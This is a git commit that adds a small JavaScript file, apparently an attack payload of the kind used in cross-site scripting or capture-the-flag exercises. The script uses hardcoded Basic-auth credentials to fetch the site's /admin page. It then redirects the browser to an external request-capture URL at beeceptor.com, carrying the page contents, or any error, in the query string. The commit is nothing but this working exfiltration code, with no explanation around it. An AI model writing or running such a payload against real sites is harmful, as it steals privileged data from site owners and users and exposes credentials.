46587b0222c6e4c1152972e56e4814fb314814db
Oleg Esakov <73789889+TWTZptr@users.noreply.github.com>
2025-01-09 09:23:00 +0300

    Create fasdfsasdf111.js

---
+++ fasdfsasdf111.js
@@ -0,0 +1,9 @@
+(async () => {
+  let headers = new Headers();
+  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
+  fetch('/admin', {headers, redirect: 'manual'}).then(res => res.text()).then(res => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + encodeURIComponent(res).slice(0, 1000));
+  }).catch(err => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
+  });
+})()
